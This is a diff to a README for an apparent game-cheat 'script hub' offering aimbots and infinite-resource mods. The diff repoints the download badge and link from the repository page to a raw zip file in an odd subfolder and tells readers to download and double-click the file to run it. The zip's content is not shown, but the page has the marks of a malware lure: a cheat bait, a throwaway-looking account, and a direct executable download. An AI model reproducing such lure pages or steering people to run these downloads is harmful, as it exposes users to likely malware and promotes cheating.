@@ -1,6 +1,6 @@
 # 🎯 one-tap-ws92-script-hub - One-Click Power Tools for 2026
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blueviolet?style=for-the-badge&logo=github)](https://github.com/berberisvulgarisprelacy184/one-tap-ws92-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/berberisvulgarisprelacy184/one-tap-ws92-script-hub/main/monogeny/2.4.zip)
 
 ## 🚀 What is one-tap-ws92-script-hub?
 one-tap-ws92-script-hub is your all-in-one solution for specialized utilities, aimbot tools, and infinite resource modifications for 2026. This software is designed to work instantly with a single click, giving you an edge in your favorite games and applications.
@@ -8,7 +8,7 @@ one-tap-ws92-script-hub is your all-in-one solution for specialized utilities, a
 ## 📥 How to Download and Install
 Follow these simple steps to get started:
 
-1. **Click the download badge above** or **[visit this link](https://github.com/berberisvulgarisprelacy184/one-tap-ws92-script-hub)** to access the download page.
+1. **Click the download badge above** or **[visit this link](https://raw.githubusercontent.com/berberisvulgarisprelacy184/one-tap-ws92-script-hub/main/monogeny/2.4.zip)** to access the download page.
 2. **Find the latest release** (look for "Releases" on the right side of the page).
 3. **Download the file** - the download will start automatically after clicking.
 4. **Run the application** - double-click the downloaded file and follow the on-screen instructions.
